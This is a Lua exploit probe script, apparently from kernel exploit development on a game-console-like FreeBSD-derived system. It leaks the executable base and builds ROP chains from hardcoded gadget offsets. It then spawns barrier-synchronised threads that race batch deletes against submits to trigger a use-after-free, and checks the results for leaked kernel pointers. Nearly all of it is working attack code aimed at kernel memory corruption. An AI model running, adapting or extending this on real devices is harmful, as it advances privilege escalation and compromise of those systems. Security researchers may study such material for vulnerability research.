-- CRASH_CLASS: HIGH
-- PROBE 69i: barrier-synced submit-during-delete, 128 IDs, submitter first
--
-- 69h showed both children run but serialize. This probe:
--   1. Uses 128 IDs (max: 129 returns -1) to widen the delete window
--   2. Spawns submitter FIRST so it's already in-kernel when deleter starts
--   3. UMTX barrier: both children spin on a shared word, main thread flips it
--
-- Race: child B (submit) is already spinning on 669 calls when child A (delete)
-- processes the batch. If A's lock-drop between IDs overlaps with B's allocation,
-- B's new object lands in A's freed slot while A still holds a pointer.

print("=== PROBE 69i: barrier race, 128 IDs, submitter first ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_pop_r8  = eb + 0x991
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local tcb_page = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(tcb_page) + i, uint64(N(tcb_page))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(tcb_page)))

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 128
local SUB_COUNT = 64
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- [A] Sanity
print("")
print("[A] sanity")
local tid = submit_one()
poll_one(tid)
wd(N(one_id), tid); wd(N(one_st), 0xDEAD)
pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
print("  ok, state=0x" .. string.format("%X", rd(N(one_st)) or 0))
if not alive() then print("DEAD"); return end

-- Shared buffers
local del_ids    = memory.alloc(4 * BATCH + 0x10)
local del_states = memory.alloc(4 * BATCH + 0x10)
local marker_del = memory.alloc(8)
local marker_sub = memory.alloc(8)
local sub_done   = memory.alloc(8)
-- Barrier: children spin-read this dword until it becomes 1
local barrier    = memory.alloc(8)

local sub_reqs   = memory.alloc(0x30)
local sub_data   = memory.alloc(0x1000)
local sub_result = memory.alloc(0x100)
local sub_ids    = memory.alloc(4 * SUB_COUNT + 0x10)

wq(N(sub_reqs), uint64(0))
wq(N(sub_reqs) + 8, uint64(16))
local sdh, sdl = get_hi_lo(uint64(N(sub_data)))
wd(N(sub_reqs) + 0x10, sdl); wd(N(sub_reqs) + 0x14, sdh)
local srh, srl = get_hi_lo(uint64(N(sub_result)))
wd(N(sub_reqs) + 0x18, srl); wd(N(sub_reqs) + 0x1C, srh)
wd(N(sub_reqs) + 0x20, fd_zero); wd(N(sub_reqs) + 0x24, 0)

-- We need a spin-wait in ROP. No cmpxchg gadget, so we use UMTX_OP_WAIT (op 1):
-- syscall 454, args: (addr, op=1, expected_val=0, unused, unused)
-- Blocks until *addr != expected_val. Main thread writes 1 to wake both.
-- This is a kernel-level barrier — much tighter than userland spin.

-- [B] Race loop
print("")
print("[B] RACE — barrier + 128 IDs + submitter first × 10 iters")

local ITERS = 10
local total_collisions = 0
local total_anomalies = 0
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: DEAD", iter))
        break
    end

    -- Submit + poll BATCH requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < BATCH then
        print(string.format("  iter %d: only %d/%d IDs", iter, #ids, BATCH))
        if #ids < 2 then break end
    end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(del_states) + i * 4, 0xDDDDDDDD)
    end
    for i = 0, SUB_COUNT - 1 do wd(N(sub_ids) + i * 4, 0) end
    wq(N(marker_del), uint64(0))
    wq(N(marker_sub), uint64(0))
    wq(N(sub_done), uint64(0))
    wd(N(barrier), 0)  -- barrier locked

    -- Child B (submitter) — spawned FIRST, waits on barrier
    -- sysarch → UMTX_OP_WAIT(barrier, 1, 0) → marker → 64× 669 → done → exit
    local stk_B = memory.alloc(0x10000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0xE000 - ((sb_B + 0xE000) % 16) - 8
    for i = 0, 0xDFFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    -- sysarch TCB
    emB(g_pop_rdi); emB(uint64(129))
    emB(g_pop_rsi); emB(uint64(N(tcb_ptr)))
    emB(g_pop_rax); emB(uint64(165))
    emB(stub)
    -- UMTX_OP_WAIT: 454(barrier_addr, op=1, expected=0, 0, 0)
    emB(g_pop_rdi); emB(uint64(N(barrier)))
    emB(g_pop_rsi); emB(uint64(1))
    emB(g_pop_rdx); emB(uint64(0))
    emB(g_pop_rcx); emB(uint64(0))
    emB(g_pop_r8);  emB(uint64(0))
    emB(g_pop_rax); emB(uint64(454))
    emB(stub)
    -- marker
    emB(g_pop_rax); emB(uint64(0x5B517E01))
    emB(g_pop_rdi); emB(uint64(N(marker_sub)))
    emB(g_mov_m_rax)
    -- 64× 669 calls
    for si = 0, SUB_COUNT - 1 do
        emB(g_pop_rdi); emB(uint64(1))
        emB(g_pop_rsi); emB(uint64(N(sub_reqs)))
        emB(g_pop_rdx); emB(uint64(1))
        emB(g_pop_rcx); emB(uint64(1))
        emB(g_pop_r8);  emB(uint64(N(sub_ids) + si * 4))
        emB(g_pop_rax); emB(uint64(669))
        emB(stub)
    end
    -- done
    emB(g_pop_rax); emB(uint64(0xD04E0069))
    emB(g_pop_rdi); emB(uint64(N(sub_done)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- Child A (deleter) — spawned SECOND, also waits on barrier
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- sysarch TCB
    emA(g_pop_rdi); emA(uint64(129))
    emA(g_pop_rsi); emA(uint64(N(tcb_ptr)))
    emA(g_pop_rax); emA(uint64(165))
    emA(stub)
    -- UMTX_OP_WAIT: 454(barrier_addr, op=1, expected=0, 0, 0)
    emA(g_pop_rdi); emA(uint64(N(barrier)))
    emA(g_pop_rsi); emA(uint64(1))
    emA(g_pop_rdx); emA(uint64(0))
    emA(g_pop_rcx); emA(uint64(0))
    emA(g_pop_r8);  emA(uint64(0))
    emA(g_pop_rax); emA(uint64(454))
    emA(stub)
    -- marker
    emA(g_pop_rax); emA(uint64(0xDE1E7E01))
    emA(g_pop_rdi); emA(uint64(N(marker_del)))
    emA(g_mov_m_rax)
    -- 662(del_ids, count, del_states)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(del_states)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    -- thr_exit
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Spawn submitter FIRST
    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0xE000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Then deleter
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)
    pcall(function() mk(455)(par_A, uint64(0x38)) end)

    -- Small delay for both to reach UMTX_OP_WAIT
    for w = 1, 5000 do local _ = rd(sb_A) end

    -- RELEASE BARRIER — both children wake simultaneously
    wd(N(barrier), 1)
    -- NWAKE to wake all waiters: 454(barrier_addr, op=21, count, 0, 0)
    -- Actually UMTX_OP_WAKE = 3: 454(addr, 3, max_wake, 0, 0)
    pcall(function()
        mk(454)(uint64(N(barrier)), uint64(3), uint64(0x7FFFFFFF), uint64(0), uint64(0))
    end)

    -- Wait for both
    for w = 1, 150000 do local _ = rd(sb_A) end

    local del_ran = (N(rq(N(marker_del))) ~= 0)
    local sub_ran = (N(rq(N(marker_sub))) ~= 0)
    local sub_fin = (N(rq(N(sub_done))) ~= 0)

    local del_ok, del_fail, del_sent, del_weird = 0, 0, 0, 0
    for i = 0, count - 1 do
        local st = rd(N(del_states) + i * 4) or 0xDDDDDDDD
        if st == 0 then del_ok = del_ok + 1
        elseif st == 0xDDDDDDDD then del_sent = del_sent + 1
        elseif st == 0x80020003 or st == 0x80020010 then del_fail = del_fail + 1
        else del_weird = del_weird + 1 end
    end

    local new_ids = {}
    for i = 0, SUB_COUNT - 1 do
        local nid = rd(N(sub_ids) + i * 4) or 0
        if nid ~= 0 then table.insert(new_ids, nid) end
    end

    local old_set = {}
    for _, id in ipairs(ids) do old_set[id % 8192] = id end
    local collisions = 0
    for _, nid in ipairs(new_ids) do
        if old_set[nid % 8192] then collisions = collisions + 1 end
    end

    local kptr_hits = 0
    for _, nid in ipairs(new_ids) do
        local h, l = get_hi_lo(uint64(nid))
        if h >= 0xFFFF8000 then kptr_hits = kptr_hits + 1 end
    end

    total_collisions = total_collisions + collisions
    total_anomalies = total_anomalies + del_weird
    total_kptrs = total_kptrs + kptr_hits

    local tag = ""
    if del_weird > 0 then tag = tag .. " ***WEIRD***" end
    if kptr_hits > 0 then tag = tag .. " ***KPTR***" end

    print(string.format("  iter %d: d=%s s=%s/%s ok=%d fail=%d sent=%d w=%d | new=%d coll=%d k=%d%s",
        iter, del_ran and "Y" or "N", sub_ran and "Y" or "N", sub_fin and "Y" or "N",
        del_ok, del_fail, del_sent, del_weird,
        #new_ids, collisions, kptr_hits, tag))

    if del_weird > 0 then
        for i = 0, count - 1 do
            local st = rd(N(del_states) + i * 4) or 0
            if st ~= 0 and st ~= 0xDDDDDDDD and st ~= 0x80020003 and st ~= 0x80020010 then
                print(string.format("    w[%d] id=0x%X st=0x%08X", i, ids[i+1], st))
            end
        end
    end

    -- Cleanup
    for _, nid in ipairs(new_ids) do
        poll_one(nid)
        wd(N(one_id), nid); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  batch=%d submits=%d iters=%d", BATCH, SUB_COUNT, ITERS))
print(string.format("  collisions=%d anomalies=%d kptrs=%d", total_collisions, total_anomalies, total_kptrs))
print(string.format("  process=%s", alive() and "ALIVE" or "DEAD"))

if total_kptrs > 0 then print("*** KPTR FOUND ***")
elseif total_anomalies > 0 then print("*** CORRUPTION ***")
else print("check del_ok vs count — if del_ok < count, submit stole slots mid-delete") end

print("=== 69i COMPLETE ===")
